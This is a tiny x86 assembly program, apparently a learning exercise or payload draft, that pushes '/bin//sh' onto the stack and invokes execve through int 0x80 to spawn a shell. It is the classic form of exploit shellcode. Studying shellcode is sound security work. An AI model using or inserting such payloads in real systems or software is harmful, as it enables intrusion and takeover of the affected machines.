BITS 32

global _start

_start:
    mov eax, 0x0

    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    mov eax, 0xb    
    mov ecx, 0x0    
    mov edx, 0x0    
    int 0x80
